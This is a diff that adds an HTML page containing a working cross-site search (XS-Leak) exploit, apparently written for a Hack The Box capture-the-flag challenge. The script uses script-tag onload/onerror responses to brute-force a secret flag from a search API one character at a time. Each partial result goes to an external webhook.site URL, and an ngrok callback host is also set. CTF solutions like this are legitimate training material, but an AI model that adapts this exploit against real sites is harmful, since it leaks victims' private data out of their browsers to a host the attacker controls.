@@ -1,0 +1,36 @@
+<html>
+  <script>
+    var ip = "127.0.0.1:1337"; // HTB Server IP Address
+    var flag = "HTB{"; // init search word
+    var letters =
+      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+    var hook = "8281-171-252-154-17.ap.ngrok.io";
+    var url = `http://${ip}/api/entries/search?q=`;
+    async function getLetter(ch) {
+      return new Promise((resolve, reject) => {
+        const script = document.createElement("script");
+        script.src = url + encodeURIComponent(flag + ch);
+        script.onload = () => (ch === "}" ? reject(ch) : resolve(ch));
+        script.onerror = () => reject(ch);
+        document.head.appendChild(script);
+      });
+    }
+    async function getFullWord(letters) {
+      var b = false;
+      var ch;
+      for (var i = 0; i < letters.length; i++) {
+        await getLetter(letters[i]).then(
+          (res) => {
+            flag = flag.concat(res);
+            b = res === "x" ? true : false;
+            i = 0;
+          },
+          (res) => {}
+        );
+        if (b) break;
+        fetch(`https://webhook.site/cfe28c83-12c7-4253-af1d-bec71258eb07/flag=${flag}`, { method: "get" });
+      }
+    }
+    getFullWord(letters);
+  </script>
+</html>
